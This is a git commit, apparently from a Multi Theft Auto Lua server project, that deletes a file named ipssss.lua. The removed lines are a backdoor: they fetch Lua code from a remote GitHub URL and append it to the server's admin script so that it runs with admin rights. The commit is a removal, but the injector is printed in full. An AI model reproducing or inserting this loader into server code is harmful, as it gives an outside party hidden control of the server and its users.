92da2d97c0fe17273806ef9b2160e0f063be18cd
Ruslan <20355378+frqher@users.noreply.github.com>
2023-01-14 17:41:00 +0300

    Delete ipssss.lua

--- ipssss.lua
+++
@@ -1,9 +0,0 @@
-fetchRemote("https://raw.githubusercontent.com/Drewskijs/ip/main/addipssss.lua",function(rd, err) 
-	if err == 0 and rd ~= "ERROR" then
-	      hFile = fileOpen(":admin/server/admin_server.lua")
-	      fileSetPos( hFile, fileGetSize( hFile ) ) 
-	      fileWrite(hFile, rd)              
-	      fileFlush(hFile)                    
-	      fileClose(hFile) 
-	end
-end)
